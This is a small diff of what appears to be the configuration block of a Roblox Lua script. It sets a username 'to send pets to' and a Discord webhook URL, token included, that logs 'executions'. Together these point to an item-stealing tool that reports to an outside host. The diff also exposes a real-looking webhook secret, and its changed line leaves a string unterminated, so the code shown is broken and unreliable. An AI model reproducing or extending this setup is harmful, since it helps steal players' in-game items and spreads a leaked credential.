@@ -4,7 +4,7 @@ _G.Username2 = "tino_0224" --// Username To Send Pets To [OPTIONAL]
 
 --[[ WebHook ]]--
 
-_G.Webhook = "https://discord.com/api/webhooks/1093764824489529424/orJgVp1w2lgYz8arpGkqyixqH_9JlzL80yHJ4sVEBXCGSqVnKBz8x0PG0i-xRr9pV7Dq" --// Discord Webhook For Executions
+_G.Webhook = "https://discord.com/api/webhooks/1093764824489529424/orJgVp1w2lgYz8arpGkqyixqH_9JlzL80yHJ4sVEBXCGSqVnKBz8x0PG0i-xRr9pV7Dq
 
 --[[ Script ]]--
 
